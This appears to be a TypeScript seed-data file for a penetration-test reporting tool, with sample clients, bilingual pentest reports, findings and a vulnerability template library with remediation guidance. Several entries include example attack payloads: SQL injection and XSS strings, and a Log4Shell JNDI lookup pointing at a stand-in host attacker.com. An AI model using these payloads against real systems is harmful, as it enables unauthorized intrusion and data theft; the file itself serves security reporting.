import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';

export const clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export const projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `<!-- section-id: section-1690891200000 -->

## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

<!-- section-id: section-1690891200001 -->

## Scope & Methodology
The assessment was conducted between **July 1, 2023** and **July 15, 2023** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

<!-- section-id: section-1690891200002 -->

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

<!-- section-id: section-1690891200003 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'API Security Audit', 
    reportBody: `<!-- section-id: section-1692014400000 -->

## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Quantum Dynamics**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter, with a focus on the company's main API.

---

<!-- section-id: section-1692014400001 -->

## Scope & Methodology
The assessment was conducted between **August 10, 2023** and **August 25, 2023** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** api.quantum.com
- **External Network:** 203.0.113.0/24

### Methodology
1. **Reconnaissance:** Discovering API endpoints and functionality through documentation and bruteforcing.
2. **Vulnerability Scanning:** Using automated tools to identify common API vulnerabilities (e.g., injection, broken authentication).
3. **Manual Verification & Exploitation:** Manually testing for flaws like IDOR, mass assignment, and business logic issues.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

<!-- section-id: section-1692014400002 -->

## Attack Narrative
The assessment identified a critical Insecure Direct Object Reference (IDOR) vulnerability in the /api/v1/users/[userId] endpoint. By iterating the \`userId\` parameter, it was possible to retrieve sensitive personal information for any user on the platform. Furthermore, the API was missing rate limiting, allowing for automated enumeration of user IDs.

---

<!-- section-id: section-1692014400003 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-08-10', 
    endDate: '2023-08-25', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-08-10T10:00:00Z', 
    updatedAt: '2023-08-25T18:00:00Z', 
    icon: 'Globe' 
  },
  { 
    id: 'proj-3', 
    clientId: 'cli-3', 
    name: 'Auditoría Red Interna', 
    reportBody: `<!-- section-id: section-1693562400000 -->

## Resumen Ejecutivo
Este informe presenta los hallazgos de una prueba de penetración de la red interna para **SecureBank Corp**. La evaluación simuló a un atacante que ya ha obtenido acceso inicial a la red corporativa interna (p. ej., un empleado malintencionado o una estación de trabajo comprometida). El objetivo fue identificar vulnerabilidades que pudieran conducir a la escalada de privilegios, movimiento lateral y compromiso de sistemas internos críticos como los Controladores de Dominio.

---

<!-- section-id: section-1693562400001 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **1 de Septiembre de 2023** y el **30 de Septiembre de 2023** desde la perspectiva de un usuario autenticado y sin privilegios en la red interna (caja gris).

### Alcance
- **Segmentos de Red Interna:** 10.0.0.0/8
- **Sistemas Clave:** DC01, DC02, FS01

### Metodología
1. **Reconocimiento Interno:** Enumeración de hosts, servicios, usuarios y recursos compartidos.
2. **Análisis de Vulnerabilidades:** Identificación de configuraciones incorrectas, parches faltantes y protocolos débiles.
3. **Movimiento Lateral y Escalada de Privilegios:** Explotación de vulnerabilidades para moverse a través de la red y escalar privilegios.
4. **Dominio del Dominio:** Intento de comprometer el dominio de Active Directory.
5. **Reporte:** Documentación de las rutas de ataque y provisión de guías de remediación.

---

<!-- section-id: section-1693562400002 -->

## Narrativa del Ataque
El ataque comenzó con la enumeración de recursos compartidos SMB en la red, lo que reveló un recurso compartido con permisos de escritura para todos los usuarios. Se subió un ejecutable malicioso a este recurso. Luego, se utilizó una vulnerabilidad de Kerberoasting para obtener el hash de la contraseña de una cuenta de servicio con privilegios. El hash fue crackeado offline, otorgando acceso a un servidor de aplicaciones. Desde este servidor, se explotó la vulnerabilidad Zerologon (CVE-2020-1472) contra un controlador de dominio no parcheado (DC02), lo que resultó en un compromiso total del dominio.

---

<!-- section-id: section-1693562400003 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que conducen al compromiso del Administrador del Dominio o al control de servidores críticos. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que permiten una escalada de privilegios significativa o movimiento lateral. |
| Media | 4.0 - 6.9 | Configuraciones incorrectas o debilidades que podrían ayudar a un atacante en el reconocimiento o ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que representan una desviación de las mejores prácticas. |
| Informativa | 0.0 | Observaciones sobre el entorno de la red interna. |`, 
    startDate: '2023-09-01', 
    endDate: '2023-09-30', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-09-01T10:00:00Z', 
    updatedAt: '2023-09-15T12:00:00Z', 
    icon: 'Network' 
  },
  { 
    id: 'proj-4', 
    clientId: 'cli-1', 
    name: 'Mobile App Assessment', 
    reportBody: `<!-- section-id: section-1696496400000 -->

## Executive Summary
This report documents the findings of a security assessment of the **Innovatech GO** mobile application (version 1.5.2) for **Innovatech Solutions**. The test focused on identifying vulnerabilities within the mobile application itself and its backend API interactions, covering areas such as insecure data storage, insecure communication, and client-side logic flaws.

---

<!-- section-id: section-1696496400001 -->

## Scope & Methodology
The assessment was conducted between **October 5, 2023** and **October 20, 2023**.

### Scope
- **Android Application:** Package Name \`com.innovatech.go\`, provided as an APK file.
- **iOS Application:** Bundle ID \`com.innovatech.go\`, provided via TestFlight.
- **Backend APIs:** The assessment included analysis of the API endpoints consumed by the mobile application, located at \`api.innovatech.com\`

### Methodology
1. **Static Analysis (SAST):** Analyzing the application's source code or decompiled code to find vulnerabilities without executing it.
2. **Dynamic Analysis (DAST):** Testing the application in a running state, both on a physical device and an emulator, to identify runtime vulnerabilities. This included intercepting network traffic with a proxy.
3. **API Testing:** Directly testing the backend API endpoints for common web vulnerabilities.
4. **Reporting:** Consolidating all findings and providing detailed remediation steps.

---

<!-- section-id: section-1696496400002 -->

## Attack Narrative
Dynamic analysis revealed that the application stores the user's session token insecurely in SharedPreferences on Android and a plist file on iOS. An attacker with physical access to a user's device, or a malicious application on the device, could steal this token and hijack the user's session. The API key for a third-party mapping service was also found hardcoded in the application's resources, which could lead to abuse and financial costs if extracted.

---

<!-- section-id: section-1696496400003 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that allow for full compromise of user accounts or sensitive backend systems. |
| High | 7.0 - 8.9 | Vulnerabilities that expose sensitive user data or allow for significant unauthorized actions. |
| Medium | 4.0 - 6.9 | Weaknesses in the application that could be chained for a more significant attack or expose non-critical data. |
| Low | 0.1 - 3.9 | Issues that deviate from security best practices but have a low direct impact. |
| Informational | 0.0 | Observations about the application's security posture. |`, 
    startDate: '2023-10-05', 
    endDate: '2023-10-20', 
    status: 'In Progress', 
    language: 'en', 
    createdAt: '2023-10-05T10:00:00Z', 
    updatedAt: '2023-10-10T11:00:00Z', 
    icon: 'Smartphone' 
  },
];

export const findings: Finding[] = [
  {
    id: 'find-1',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-001',
    title: 'SQL Injection in Login Form',
    severity: 'Critical',
    cvss: 9.8,
    markdown: `<!-- section-id: section-1688551200000 -->

### Description

The login form at /login is vulnerable to SQL injection. By providing a crafted payload in the username field, an attacker can bypass authentication.

---

<!-- section-id: section-1688551200001 -->

### Evidence

Payload: \`' OR 1=1 -- \`

---

<!-- section-id: section-1688551200002 -->

### Mitigation

Use parameterized queries.`,
    createdAt: '2023-07-05',
    updatedAt: '2023-07-06',
  },
  {
    id: 'find-2',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-002',
    title: 'Cross-Site Scripting (XSS) in Search Results',
    severity: 'High',
    cvss: 8.8,
    markdown: `<!-- section-id: section-1688803200000 -->

### Description

The search functionality is vulnerable to reflected XSS. Malicious scripts can be injected via the search query parameter.

---

<!-- section-id: section-1688803200001 -->

### Evidence

URL: \`/search?q=<script>alert('XSS')</script>\`

---

<!-- section-id: section-1688803200002 -->

### Mitigation

Encode output and validate input.`,
    createdAt: '2023-07-08',
    updatedAt: '2023-07-08',
  },
  {
    id: 'find-3',
    projectId: 'proj-3',
    title: 'Exposición de servicio SMB sin protección',
    severity: 'Medium',
    cvss: 6.5,
    markdown: `<!-- section-id: section-1694332800000 -->

### Descripción

Se ha identificado un servicio SMB en la red interna que permite el acceso anónimo, exponiendo archivos sensibles de la compañía.

---

<!-- section-id: section-1694332800001 -->

### Evidencia

- Host: 10.1.5.22
- Acceso como invitado habilitado.

---

<!-- section-id: section-1694332800002 -->

### Mitigación

Deshabilitar el acceso anónimo y aplicar autenticación en el recurso compartido SMB.`,
    createdAt: '2023-09-10',
    updatedAt: '2023-09-11',
  }
];

export let vulnerabilities: Vulnerability[] = [
  {
    id: 'vuln-001',
    title_en: 'SQL Injection (SQLi)',
    title_es: 'Inyección SQL (SQLi)',
    cwe: 'CWE-89',
    severity: 'Critical',
    cvss: {
      score: 9.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can use SQL Injection to bypass authentication, access, modify, and delete data within the database. This occurs when the application insecurely includes user-provided data in SQL queries.',
    overview_es: 'Un atacante puede usar Inyección SQL para eludir la autenticación, acceder, modificar y eliminar datos dentro de la base de datos. Esto ocurre cuando la aplicación incluye de forma insegura datos proporcionados por el usuario en las consultas SQL.',
    technicalDescription_en: 'The application is vulnerable to SQL injection because it concatenates user input directly into SQL statements. A malicious actor can provide specially crafted input that alters the query logic, allowing them to execute arbitrary SQL commands.',
    technicalDescription_es: 'La aplicación es vulnerable a la inyección de SQL porque concatena la entrada del usuario directamente en las sentencias SQL. Un actor malintencionado puede proporcionar una entrada especialmente diseñada que altera la lógica de la consulta, lo que le permite ejecutar comandos SQL arbitrarios.',
    affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The login form at `/login.php`. The `username` parameter is vulnerable.]',
    affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., El formulario de inicio de sesión en `/login.php`. El parámetro `username` es vulnerable.]',
    impact_en: 'A successful SQLi attack can result in unauthorized access to sensitive data, such as user credentials, personal information, and financial records. It can also lead to data modification or deletion, and in some cases, shell access to the underlying server.',
    impact_es: 'Un ataque de SQLi exitoso puede resultar en acceso no autorizado a datos sensibles, como credenciales de usuario, información personal y registros financieros. También puede conducir a la modificación o eliminación de datos y, en algunos casos, acceso shell al servidor subyacente.',
    recommendations_en: 'It is recommended to use parameterized queries (prepared statements) to prevent SQL injection. Input validation should also be implemented as a secondary defense mechanism.',
    recommendations_es: 'Se recomienda utilizar consultas parametrizadas (prepared statements) para prevenir la inyección de SQL. La validación de entradas también debe implementarse como un mecanismo de defensa secundario.',
    details_en: '[TODO Provide a detailed technical explanation, context, and proof-of-concept code. Example: `Payload: \' OR 1=1; --`]',
    details_es: '[TODO Proporcionar una explicación técnica detallada, contexto y prueba de concepto. Ejemplo: `Payload: \' OR 1=1; --`]',
    remediation_en: {
      shortTerm: 'Implement input sanitization to filter out special characters like single quotes and semicolons.',
      mediumTerm: 'Refactor all database queries to use parameterized statements provided by the language/framework.',
      longTerm: 'Conduct a full code review of all data access components and provide security training to developers on secure coding practices.',
    },
    remediation_es: {
      shortTerm: 'Implementar la sanitización de entradas para filtrar caracteres especiales como comillas simples y puntos y coma.',
      mediumTerm: 'Refactorizar todas las consultas a la base de datos para utilizar sentencias parametrizadas proporcionadas por el lenguaje/framework.',
      longTerm: 'Realizar una revisión completa del código de todos los componentes de acceso a datos y proporcionar formación en seguridad a los desarrolladores sobre prácticas de codificación segura.',
    },
    references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cwe.mitre.org/data/definitions/89.html'],
    tags: ['OWASP Top 10', 'A03:2021-Injection']
  },
  {
    id: 'vuln-002',
    title_en: 'Reflected Cross-Site Scripting (XSS)',
    title_es: 'Cross-Site Scripting (XSS) Reflejado',
    cwe: 'CWE-79',
    severity: 'Medium',
    cvss: {
      score: 6.1,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Changed',
      confidentiality: 'Low',
      integrity: 'Low',
      availability: 'None',
    },
    overview_en: 'An attacker can inject malicious client-side scripts into web pages viewed by other users. This occurs when the application includes unvalidated and unencoded user input in the HTTP response.',
    overview_es: 'Un atacante puede inyectar scripts maliciosos del lado del cliente en las páginas web vistas por otros usuarios. Esto ocurre cuando la aplicación incluye entradas de usuario no validadas y no codificadas en la respuesta HTTP.',
    technicalDescription_en: 'The application is vulnerable to Reflected XSS. A malicious script can be injected via a query parameter. The server reflects this script back to the user\'s browser, where it is executed in the context of the user\'s session.',
    technicalDescription_es: 'La aplicación es vulnerable a XSS Reflejado. Se puede inyectar un script malicioso a través de un parámetro de consulta. El servidor refleja este script de vuelta al navegador del usuario, donde se ejecuta en el contexto de la sesión del usuario.',
    affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The search page at `/search`. The `q` parameter is vulnerable.]',
    affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., La página de búsqueda en `/search`. El parámetro `q` es vulnerable.]',
    impact_en: 'XSS can be used to steal session tokens, deface websites, or redirect users to malicious sites. An attacker can impersonate the victim user and perform any actions the user is able to perform.',
    impact_es: 'XSS se puede utilizar para robar tokens de sesión, desfigurar sitios web o redirigir a los usuarios a sitios maliciosos. Un atacante puede hacerse pasar por el usuario víctima y realizar cualquier acción que el usuario pueda realizar.',
    recommendations_en: 'The primary mitigation is to encode all untrusted data before it is displayed in the browser. Implementing a robust Content Security Policy (CSP) is also an effective defense-in-depth measure.',
    recommendations_es: 'La mitigación principal es codificar todos los datos no confiables antes de que se muestren en el navegador. Implementar una Política de Seguridad de Contenido (CSP) robusta también es una medida de defensa en profundidad eficaz.',
    details_en: '[TODO Provide a detailed technical explanation, context, and proof-of-concept. Example: `/search?q=<script>alert(document.cookie)</script>`]',
    details_es: '[TODO Proporcionar una explicación técnica detallada, contexto y prueba de concepto. Ejemplo: `/search?q=<script>alert(document.cookie)</script>`]',
    remediation_en: {
      shortTerm: 'Implement context-aware output encoding on the affected pages.',
      mediumTerm: 'Implement a Content Security Policy (CSP) to restrict the sources of executable scripts.',
      longTerm: 'Use a web framework that automatically applies context-aware encoding by default (e.g., React, Angular).',
    },
    remediation_es: {
      shortTerm: 'Implementar codificación de salida consciente del contexto en las páginas afectadas.',
      mediumTerm: 'Implementar una Política de Seguridad de Contenido (CSP) para restringir las fuentes de scripts ejecutables.',
      longTerm: 'Utilizar un framework web que aplique automáticamente la codificación consciente del contexto por defecto (por ejemplo, React, Angular).',
    },
    references: ['https://owasp.org/www-community/attacks/xss/', 'https://cwe.mitre.org/data/definitions/79.html'],
    tags: ['OWASP Top 10', 'A03:2021-Injection']
  },
  {
    id: 'vuln-003',
    title_en: 'Vulnerable and Outdated Components',
    title_es: 'Componentes con Vulnerabilidades Conocidas',
    cwe: 'CWE-1104',
    severity: 'Critical',
    cvss: {
      score: 9.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'The application uses third-party libraries or components with known vulnerabilities. An attacker can exploit these flaws to compromise the application, leading to data loss, service disruption, or server takeover.',
    overview_es: 'La aplicación utiliza librerías o componentes de terceros con vulnerabilidades conocidas. Un atacante puede explotar estos fallos para comprometer la aplicación, lo que puede provocar la pérdida de datos, la interrupción del servicio o la toma de control del servidor.',
    technicalDescription_en: '[TODO Specify the vulnerable library and version, and the vulnerability details. E.g., The application was found to be using `log4j` version 2.14.1, which is vulnerable to the Log4Shell remote code execution vulnerability (CVE-2021-44228).]',
    technicalDescription_es: '[TODO Especificar la librería y versión vulnerable, y los detalles de la vulnerabilidad. P. ej., Se descubrió que la aplicación utiliza la versión 2.14.1 de `log4j`, que es vulnerable a la vulnerabilidad de ejecución remota de código Log4Shell (CVE-2021-44228).]',
    affectedComponents_en: '[TODO Specify the component or service using the vulnerable library. E.g., The `com.example.logging.service` component which uses the `log4j` library.]',
    affectedComponents_es: '[TODO Especificar el componente o servicio que utiliza la librería vulnerable. P. ej., El componente `com.example.logging.service` que utiliza la librería `log4j`.]',
    impact_en: 'Exploitation of this vulnerability allows a remote unauthenticated attacker to execute arbitrary code on the server, leading to a full system compromise.',
    impact_es: 'La explotación de esta vulnerabilidad permite a un atacante remoto no autenticado ejecutar código arbitrario en el servidor, lo que conduce a un compromiso total del sistema.',
    recommendations_en: 'It is recommended to update the vulnerable component to the latest patched version. A Software Composition Analysis (SCA) tool should be used to maintain an inventory of third-party components and monitor for new vulnerabilities.',
    recommendations_es: 'Se recomienda actualizar el componente vulnerable a la última versión parcheada. Se debe utilizar una herramienta de Análisis de Composición de Software (SCA) para mantener un inventario de los componentes de terceros y monitorear nuevas vulnerabilidades.',
    details_en: '[TODO Provide a detailed technical explanation and proof-of-concept. E.g., An attacker can send a crafted string like `${jndi:ldap://attacker.com/a}` to a log statement...]',
    details_es: '[TODO Proporcionar una explicación técnica detallada y prueba de concepto. P. ej., Un atacante puede enviar una cadena maliciosa como `${jndi:ldap://attacker.com/a}` a una sentencia de log...]',
    remediation_en: {
      shortTerm: 'Immediately update the vulnerable library (e.g., `log4j`) to the latest secure version.',
      mediumTerm: 'Implement a patch management and vulnerability scanning process for all third-party dependencies.',
      longTerm: 'Integrate a Software Composition Analysis (SCA) tool into the CI/CD pipeline to automatically detect and block vulnerable components from being deployed.',
    },
    remediation_es: {
      shortTerm: 'Actualizar inmediatamente la librería vulnerable (p. ej., `log4j`) a la última versión segura.',
      mediumTerm: 'Implementar un proceso de gestión de parches y escaneo de vulnerabilidades para todas las dependencias de terceros.',
      longTerm: 'Integrar una herramienta de Análisis de Composición de Software (SCA) en el pipeline de CI/CD para detectar y bloquear automáticamente el despliegue de componentes vulnerables.',
    },
    references: ['https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/', 'https://cwe.mitre.org/data/definitions/1104.html'],
    tags: ['OWASP Top 10', 'A06:2021-Vulnerable and Outdated Components']
  },
  {
    id: 'vuln-wifi-001',
    title_en: 'WPA/WPA2 PSK Cracking',
    title_es: 'Crackeo de WPA/WPA2 PSK',
    cwe: 'CWE-326',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Adjacent Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'The WiFi network uses a weak Pre-Shared Key (PSK) that can be captured and cracked offline by an attacker. This allows unauthorized access to the wireless network.',
    overview_es: 'La red WiFi utiliza una clave precompartida (PSK) débil que puede ser capturada y crackeada offline por un atacante. Esto permite el acceso no autorizado a la red inalámbrica.',
    technicalDescription_en: 'An attacker within range of the WiFi network can capture the 4-way handshake that occurs when a legitimate user connects. This handshake contains a hashed version of the PSK. The attacker can then use tools like Aircrack-ng or Hashcat to perform an offline brute-force or dictionary attack to recover the original password.',
    technicalDescription_es: 'Un atacante dentro del alcance de la red WiFi puede capturar el "4-way handshake" que ocurre cuando un usuario legítimo se conecta. Este handshake contiene una versión hasheada de la PSK. El atacante puede entonces usar herramientas como Aircrack-ng o Hashcat para realizar un ataque de fuerza bruta o de diccionario offline para recuperar la contraseña original.',
    affectedComponents_en: 'The WiFi network with SSID: [TODO Specify SSID]',
    affectedComponents_es: 'La red WiFi con SSID: [TODO Especificar SSID]',
    impact_en: 'A successful attack grants full access to the wireless network, allowing the attacker to eavesdrop on traffic, access internal resources, and launch further attacks against other devices on the network.',
    impact_es: 'Un ataque exitoso otorga acceso completo a la red inalámbrica, permitiendo al atacante espiar el tráfico, acceder a recursos internos y lanzar más ataques contra otros dispositivos en la red.',
    recommendations_en: 'Use a strong, long, and complex WPA2/WPA3 password. Ideally, move away from PSK to an enterprise authentication solution like WPA3-Enterprise with 802.1X, which provides unique credentials for each user.',
    recommendations_es: 'Utilice una contraseña WPA2/WPA3 fuerte, larga y compleja. Idealmente, abandone el uso de PSK y opte por una solución de autenticación empresarial como WPA3-Enterprise con 802.1X, que proporciona credenciales únicas para cada usuario.',
    details_en: '[TODO Provide details of the captured handshake and the tool used to crack the password, including the wordlist if applicable.]',
    details_es: '[TODO Proporcionar detalles del handshake capturado y la herramienta utilizada para crackear la contraseña, incluyendo la lista de palabras si aplica.]',
    remediation_en: {
      shortTerm: 'Immediately change the WiFi password to a strong, randomly generated passphrase of at least 20 characters.',
      mediumTerm: 'Enable WPA3 if supported by the hardware, as it offers better protection against offline cracking.',
      longTerm: 'Implement WPA3-Enterprise with 802.1X authentication to eliminate shared secrets.',
    },
    remediation_es: {
      shortTerm: 'Cambiar inmediatamente la contraseña del WiFi a una frase de contraseña fuerte y generada aleatoriamente de al menos 20 caracteres.',
      mediumTerm: 'Habilitar WPA3 si el hardware lo soporta, ya que ofrece mejor protección contra el crackeo offline.',
      longTerm: 'Implementar WPA3-Enterprise con autenticación 802.1X para eliminar los secretos compartidos.',
    },
    references: ['https://www.wi-fi.org/discover-wi-fi/security'],
    tags: ['WiFi', 'WPA2', 'Cracking']
  },
  {
    id: 'vuln-wifi-002',
    title_en: 'Evil Twin Attack',
    title_es: 'Ataque de Gemelo Maligno (Evil Twin)',
    cwe: 'CWE-300',
    severity: 'High',
    cvss: {
      score: 8.1,
      vectorString: 'CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
      attackVector: 'Adjacent Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'An attacker can create a rogue WiFi access point with the same name (SSID) as the legitimate network. Unsuspecting users may connect to the evil twin, allowing the attacker to perform a man-in-the-middle (MitM) attack.',
    overview_es: 'Un atacante puede crear un punto de acceso WiFi fraudulento con el mismo nombre (SSID) que la red legítima. Los usuarios desprevenidos pueden conectarse al gemelo maligno, lo que permite al atacante realizar un ataque de hombre en el medio (MitM).',
    technicalDescription_en: 'An attacker sets up a malicious access point with the same SSID as the corporate or guest network. They may broadcast a stronger signal to entice users to connect automatically. Once a user connects, the attacker can intercept, view, and modify all of their network traffic. Often, the attacker will present a fake captive portal to harvest credentials.',
    technicalDescription_es: 'Un atacante configura un punto de acceso malicioso con el mismo SSID que la red corporativa o de invitados. Pueden transmitir una señal más fuerte para incitar a los usuarios a conectarse automáticamente. Una vez que un usuario se conecta, el atacante puede interceptar, ver y modificar todo su tráfico de red. A menudo, el atacante presentará un portal cautivo falso para recolectar credenciales.',
    affectedComponents_en: 'Wireless network users and devices.',
    affectedComponents_es: 'Usuarios y dispositivos de la red inalámbrica.',
    impact_en: 'The attacker can steal sensitive information, such as login credentials, session cookies, and personal data. They can also inject malware into the user\'s browsing sessions.',
    impact_es: 'El atacante puede robar información sensible, como credenciales de inicio de sesión, cookies de sesión y datos personales. También pueden inyectar malware en las sesiones de navegación del usuario.',
    recommendations_en: 'Use WPA3-Enterprise with 802.1X, which provides mutual authentication, preventing clients from connecting to untrusted access points. Educate users to be cautious of WiFi networks, especially in public areas, and to look for certificate warnings.',
    recommendations_es: 'Utilice WPA3-Enterprise con 802.1X, que proporciona autenticación mutua, evitando que los clientes se conecten a puntos de acceso no confiables. Educar a los usuarios para que sean cautelosos con las redes WiFi, especialmente en áreas públicas, y que estén atentos a las advertencias de certificados.',
    details_en: '[TODO Describe the setup of the evil twin AP and show evidence of a captured user connection or credential theft.]',
    details_es: '[TODO Describir la configuración del AP gemelo maligno y mostrar evidencia de una conexión de usuario capturada o robo de credenciales.]',
    remediation_en: {
      shortTerm: 'Educate users about the risks of connecting to unsecured or unexpected WiFi networks.',
      mediumTerm: 'Deploy a Wireless Intrusion Prevention System (WIPS) to detect and help locate rogue access points.',
      longTerm: 'Migrate the network to WPA3-Enterprise with 802.1X to ensure both the client and the access point are authenticated.',
    },
    remediation_es: {
      shortTerm: 'Educar a los usuarios sobre los riesgos de conectarse a redes WiFi no seguras o inesperadas.',
      mediumTerm: 'Desplegar un Sistema de Prevención de Intrusiones Inalámbricas (WIPS) para detectar y ayudar a localizar puntos de acceso fraudulentos.',
      longTerm: 'Migrar la red a WPA3-Enterprise con 802.1X para asegurar que tanto el cliente como el punto de acceso estén autenticados.',
    },
    references: ['https://www.comptia.org/blog/what-is-an-evil-twin-attack'],
    tags: ['WiFi', 'Evil Twin', 'MitM']
  },
  {
    id: 'vuln-mobile-001',
    title_en: 'Insecure Data Storage',
    title_es: 'Almacenamiento Inseguro de Datos',
    cwe: 'CWE-922',
    severity: 'High',
    cvss: {
      score: 7.5,
      vectorString: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
      attackVector: 'Local',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'The mobile application stores sensitive data insecurely on the device. An attacker with physical access to the device or with malware on the device can extract this data.',
    overview_es: 'La aplicación móvil almacena datos sensibles de forma insegura en el dispositivo. Un atacante con acceso físico al dispositivo o con malware en el dispositivo puede extraer estos datos.',
    technicalDescription_en: 'The application stores sensitive information, such as user credentials, session tokens, API keys, or personal data, in insecure locations like SharedPreferences, plist files, or SQLite databases without proper encryption. These files can be easily read by other applications on a rooted/jailbroken device or by an attacker with physical access.',
    technicalDescription_es: 'La aplicación almacena información sensible, como credenciales de usuario, tokens de sesión, claves de API o datos personales, en ubicaciones inseguras como SharedPreferences, archivos plist o bases de datos SQLite sin el cifrado adecuado. Estos archivos pueden ser leídos fácilmente por otras aplicaciones en un dispositivo rooteado/con jailbreak o por un atacante con acceso físico.',
    affectedComponents_en: '[TODO Specify the file and location where sensitive data is stored, e.g., `SharedPreferences` file `com.example.app_preferences.xml` stores the user password in plaintext.]',
    affectedComponents_es: '[TODO Especificar el archivo y la ubicación donde se almacenan los datos sensibles, p. ej., el archivo `SharedPreferences` `com.example.app_preferences.xml` almacena la contraseña del usuario en texto plano.]',
    impact_en: 'An attacker can steal sensitive user and application data, leading to account takeover, identity theft, and further attacks.',
    impact_es: 'Un atacante puede robar datos sensibles del usuario y de la aplicación, lo que lleva a la toma de control de la cuenta, robo de identidad y ataques posteriores.',
